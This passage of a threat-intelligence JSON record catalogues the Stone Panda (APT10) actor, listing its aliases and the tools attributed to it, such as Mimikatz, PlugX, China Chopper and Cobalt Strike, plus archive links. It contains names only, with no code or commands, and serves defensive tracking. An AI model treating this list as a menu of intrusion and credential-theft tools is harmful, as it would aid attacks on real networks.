                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "04b07437-41bb-4126-bcbb-def16f19d7c6",
            "created_at": "2022-10-25T16:07:24.232628Z",
            "updated_at": "2025-03-27T02:02:10.146043Z",
            "deleted_at": null,
            "main_name": "Stone Panda",
            "aliases": [
                "APT 10",
                "ATK 41",
                "Bronze Riverside",
                "CTG-5938",
                "CVNX",
                "Cuckoo Spear",
                "Earth Kasha",
                "Granite Taurus",
                "Happyyongzi",
                "Hogfish",
                "ITG01",
                "Operation A41APT",
                "Operation Cache Panda",
                "Operation ChessMaster",
                "Operation Cloud Hopper",
                "Operation Cuckoo Spear",
                "Operation New Battle",
                "Operation Soft Cell",
                "Operation TradeSecret",
                "Potassium",
                "Red Apollo",
                "Stone Panda",
                "TA429",
                "menuPass",
                "menuPass Team"
            ],
            "source_name": "ETDA:Stone Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Anel",
                "AngryRebel",
                "BKDR_EVILOGE",
                "BKDR_HGDER",
                "BKDR_NVICM",
                "BUGJUICE",
                "CHINACHOPPER",
                "ChChes",
                "China Chopper",
                "Chymine",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "DARKTOWN",
                "DESLoader",
                "DILLJUICE",
                "DILLWEED",
                "Darkmoon",
                "DelfsCake",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "Ecipekac",
                "Emdivi",
                "EvilGrab",
                "EvilGrab RAT",
                "FYAnti",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "GreetCake",
                "HAYMAKER",
                "HEAVYHAND",
                "HEAVYPOT",
                "HTran",
                "HUC Packet Transmit Tool",
                "Ham Backdoor",
                "HiddenFace",
                "Impacket",
                "Invoke the Hash",
                "KABOB",
                "Kaba",
                "Korplug",
                "LODEINFO",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MiS-Type",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "NBTscan",
                "NOOPDOOR",
                "Newsripper",
                "P8RAT",
                "PCRat",
                "PlugX",
                "Poison Ivy",
                "Poldat",
                "PowerSploit",
                "PowerView",
                "PsExec",
                "PsList",
                "Quarks PwDump",
                "Quasar RAT",
                "QuasarRAT",
                "RedDelta",
                "RedLeaves",
                "Rubeus",
                "SNUGRIDE",
                "SPIVY",
                "SharpSploit",
                "SigLoader",
                "SinoChopper",
                "SodaMaster",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "UpperCut",
                "Vidgrab",
                "WinRAR",
                "WmiExec",
                "Wmonder",
                "Xamtrav",
                "Yggdrasil",
                "Zlib",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "dfls",
                "lena",
                "nbtscan",
                "pivy",
                "poisonivy",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041834,
    "ts_creation_date": 1621946285,
    "ts_modification_date": 1622721347,
    "files": {
        "pdf": "https://archive.orkl.eu/3d1758b8642656de16416d5c24020dec3ac1c332.pdf",
        "text": "https://archive.orkl.eu/3d1758b8642656de16416d5c24020dec3ac1c332.txt",
        "img": "https://archive.orkl.eu/3d1758b8642656de16416d5c24020dec3ac1c332.jpg"
    }
}